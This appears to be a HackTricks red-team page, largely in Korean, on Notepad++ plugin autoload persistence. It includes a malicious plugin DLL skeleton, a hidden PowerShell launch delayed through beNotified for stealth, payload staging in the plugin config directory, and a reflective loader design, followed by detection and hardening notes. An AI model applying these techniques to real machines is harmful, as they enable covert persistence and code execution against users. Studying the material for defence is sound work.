# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++는 실행 시 **plugins** 하위 폴더에서 찾은 모든 plugin DLL을 **자동 로드**합니다. 임의의 **쓰기 가능한 Notepad++ 설치 경로**에 malicious plugin을 떨어뜨리면 편집기가 시작될 때마다 `notepad++.exe` 내부에서 code execution이 발생하며, 이를 **persistence**, 은밀한 **initial execution**, 또는 편집기가 elevated 상태로 실행될 때의 **in-process loader**로 악용할 수 있습니다.

**Notepad++ 7.6+**부터는 수동 설치 시 예상되는 구조가 **plugin당 하나의 하위 폴더**입니다 (`plugins\<PluginName>\<PluginName>.dll`). **portable mode**에서는 (`notepad++.exe` 옆에 `doLocalConf.xml`이 존재하는 경우) 전체 애플리케이션 트리가 해당 디렉터리 안에 로컬로 유지되며, 이는 복사된/admin tool 번들을 쉽게 user-writable execution surface로 바꾸는 경우가 많습니다.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (보통 쓰기 위해 admin 권한이 필요함).
- Low-privileged operators를 위한 writable 옵션:
- **portable Notepad++ build**를 user-writable 폴더에서 사용.
- `C:\Program Files\Notepad++`를 user-controlled path(예: `%LOCALAPPDATA%\npp\`)로 복사한 뒤 거기서 `notepad++.exe` 실행.
- 이미 `doLocalConf.xml`을 포함하고 `Program Files` 밖에 있는 **admin tool bundles**, 압축 해제된 zip 복사본, 또는 help-desk toolkits를 찾기.
- 각 plugin은 `plugins` 아래에 자신만의 하위 폴더를 가지며 시작 시 자동으로 로드됩니다; 메뉴 항목은 **Plugins** 아래에 나타납니다.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++는 특정 **exported functions**를 기대합니다. 이들은 초기화 중 모두 호출되어 여러 execution surface를 제공합니다:
- **`DllMain`** — DLL load 시 즉시 실행됨(첫 번째 execution point).
- **`setInfo(NppData)`** — Notepad++ handles를 제공하기 위해 load 시 한 번 호출됨; 일반적으로 menu items를 등록하는 위치.
- **`getName()`** — menu에 표시될 plugin 이름을 반환함.
- **`getFuncsArray(int *nbF)`** — menu commands를 반환함; 비어 있어도 startup 중 호출됨.
- **`beNotified(SCNotification*)`** — Notepad++ / Scintilla events를 수신함(사용자 action 또는 editor event까지 payload를 지연시키는 데 유용).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler이며, 더 큰 data exchange에 유용함.
- **`isUnicode()`** — load 시 확인되는 compatibility flag.

대부분의 exports는 **stubs**로 구현할 수 있으며; execution은 `DllMain` 또는 autoload 중 위의 callback들 중 아무 곳에서나 발생할 수 있습니다.

## Minimal malicious plugin skeleton
기대되는 exports를 포함한 DLL을 컴파일하고, writable Notepad++ folder 아래의 `plugins\\MyNewPlugin\\MyNewPlugin.dll`에 배치하세요:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. DLL을 빌드합니다 (Visual Studio/MinGW).
2. `plugins` 아래에 plugin 하위 폴더를 만들고 그 안에 DLL을 넣습니다.
3. Notepad++를 다시 시작합니다. DLL이 자동으로 로드되며, `DllMain`과 이후 콜백이 실행됩니다.

## `beNotified`를 통한 저소음 트리거 패턴
OPSEC 관점에서 많은 payload는 `DllMain`에서 **실행되면 안 됩니다**. 더 조용한 패턴은 plugin이 정상적으로 로드되게 한 다음, **startup complete**, **buffer activation**, 또는 **첫 번째 입력 문자** 같은 현실적인 editor 이벤트가 발생한 뒤에만 실행하는 것입니다.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
이것은 시끄러운 `DllMain` beacon보다 공개 offensive research에 더 잘 맞는다: DLL은 여전히 시작 시 autoload되지만, 악성 동작은 Notepad++가 실제로 사용 중인 것처럼 보일 때까지 지연된다.

## Using the plugin config directory as secondary storage
Notepad++는 `NPPM_GETPLUGINSCONFIGDIR`을 노출하며, 이는 **현재 사용자의 plugin configuration directory**를 반환한다. 악성 plugin은 이를 사용해 디스크상의 DLL을 최소화한 채, 암호화된 config, staged payloads, 또는 tasking files를 정상적인 plugin state와 섞여 보이는 경로에 저장할 수 있다.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationally this is useful when you want:
- a tiny autoloaded bootstrap DLL;
- per-user tasking without touching the main plugin binary again;
- to separate the **autoload trigger** from the heavier second stage.

## Reflective loader plugin pattern
A weaponized plugin can turn Notepad++ into a **reflective DLL loader**:
- Present a minimal UI/menu entry (e.g., "LoadDLL").
- Accept a **file path** or **URL** to fetch a payload DLL.
- Reflectively map the DLL into the current process and invoke an exported entry point (e.g., a loader function inside the fetched DLL).
- Benefit: reuse a benign-looking GUI process instead of spawning a new loader; payload inherits the integrity of `notepad++.exe` (including elevated contexts).
- Trade-offs: dropping an **unsigned plugin DLL** to disk is noisy; a practical variation is to use the autoloaded plugin only as a stub and keep the real implant encrypted/staged elsewhere.

## Detection and hardening notes
- Block or monitor **writes to Notepad++ plugin directories** (including portable copies in user profiles); enable controlled folder access or application allowlisting.
- Alert on **new unsigned DLLs** under `plugins`, changes to portable Notepad++ trees, and unusual **child processes/network activity** from `notepad++.exe`.
- Baseline legitimate plugins and investigate any new DLL that exports the normal Notepad++ plugin interface but also spawns shells, PowerShell, or network beacons.
- Enforce plugin installation via **Plugins Admin** only, and restrict execution of portable copies from untrusted paths.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
